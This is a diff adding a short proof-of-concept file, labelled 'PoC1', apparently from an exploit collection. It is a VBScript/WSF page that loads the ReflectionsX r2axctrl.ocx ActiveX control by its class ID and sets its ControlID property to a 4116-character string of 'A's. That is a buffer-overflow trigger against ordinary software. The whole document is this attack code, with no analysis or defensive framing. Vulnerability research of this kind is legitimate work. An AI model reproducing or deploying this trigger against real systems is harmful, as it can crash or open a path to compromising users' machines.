@@ -1,0 +1,21 @@
+&lt;html&gt;
+PoC1
+&lt;?XML version=&#039;1.0&#039; standalone=&#039;yes&#039; ?&gt;
+&lt;package&gt;&lt;job id=&#039;DoneInVBS&#039; debug=&#039;false&#039; error=&#039;true&#039;&gt;
+&lt;object classid=&#039;clsid:15B168B2-AD3C-11D1-A8D8-00A0C9200E61&#039; id=&#039;target&#039; /&gt;
+&lt;script language=&#039;vbscript&#039;&gt;
+ 
+&#039;Wscript.echo typename(target)
+ 
+&#039;for debugging/custom prolog
+targetFile = &quot;C:\Program Files\ReflectionsX\r2axctrl.ocx&quot;
+prototype  = &quot;Property Let ControlID As String&quot;
+memberName = &quot;ControlID&quot;
+progid     = &quot;R2AXCTRLLib.R2winCtrl&quot;
+argCount   = 1
+ 
+arg1=String(4116, &quot;A&quot;)
+ 
+target.ControlID = arg1
+ 
+&lt;/script&gt;&lt;/job&gt;&lt;/package&gt;&lt;/html&gt;
